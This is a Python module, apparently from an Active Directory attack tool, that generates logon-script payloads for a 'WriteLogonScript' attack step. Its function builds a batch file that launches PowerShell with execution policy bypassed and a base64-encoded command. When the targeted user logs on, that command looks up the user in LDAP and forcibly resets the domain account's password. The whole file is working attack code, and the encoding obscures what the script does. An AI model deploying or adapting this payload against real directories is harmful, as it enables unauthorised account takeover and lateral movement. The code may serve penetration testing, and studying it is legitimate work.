"""Reusable payload builders for logon-script based execution.

The ``WriteLogonScript`` attack step is only the delivery mechanism. This
module keeps the generated script bodies separate from the execution UX so we
can add more payload strategies over time without bloating the CLI executor.
"""

from __future__ import annotations

import base64
from dataclasses import dataclass
import re


_SAFE_TOKEN_RE = re.compile(r"[^a-zA-Z0-9_.-]+")


@dataclass(frozen=True, slots=True)
class LogonScriptPayload:
    """One generated logon-script payload."""

    strategy_key: str
    filename: str
    script_path_value: str
    file_contents: bytes
    description: str


def sanitize_logon_script_filename_token(value: str) -> str:
    """Return a stable filename-safe token."""
    cleaned = _SAFE_TOKEN_RE.sub("_", str(value or "").strip())
    cleaned = cleaned.strip("._")
    return cleaned or "payload"


def _escape_powershell_single_quoted(value: str) -> str:
    """Escape one string for use inside a PowerShell single-quoted literal."""
    return str(value or "").replace("'", "''")


def build_force_change_password_logon_script(
    *,
    target_username: str,
    new_password: str,
    filename_prefix: str = "adscan-fcp-",
    filename_suffix_token: str | None = None,
) -> LogonScriptPayload:
    """Build a logon script that force-changes a domain user's password."""
    target_clean = str(target_username or "").strip()
    password_clean = str(new_password or "")
    filename_token = sanitize_logon_script_filename_token(target_clean)
    suffix_token = sanitize_logon_script_filename_token(filename_suffix_token or "")
    if suffix_token:
        filename = f"{filename_prefix}{filename_token}-{suffix_token}.bat"
    else:
        filename = f"{filename_prefix}{filename_token}.bat"
    target_ps = _escape_powershell_single_quoted(target_clean)
    password_ps = _escape_powershell_single_quoted(password_clean)
    powershell_script = (
        "$root=[ADSI]'LDAP://RootDSE';"
        "$base='LDAP://'+$root.defaultNamingContext;"
        "$u=[ADSI]$base;"
        "$s=New-Object DirectoryServices.DirectorySearcher($u);"
        f"$s.Filter='(samAccountName={target_ps})';"
        "$r=$s.FindOne();"
        "if($null -eq $r){exit 1};"
        "$obj=[ADSI]$r.Path;"
        f"$obj.SetPassword('{password_ps}');"
        "$obj.CommitChanges()"
    )
    encoded_script = base64.b64encode(
        powershell_script.encode("utf-16le")
    ).decode("ascii")
    script_lines = [
        "@echo off",
        "powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass "
        f"-EncodedCommand {encoded_script}",
        "exit /b %errorlevel%",
        "",
    ]
    return LogonScriptPayload(
        strategy_key="force_change_password",
        filename=filename,
        script_path_value=filename,
        file_contents="\r\n".join(script_lines).encode("utf-8"),
        description=f"Reset domain password for {target_clean}",
    )
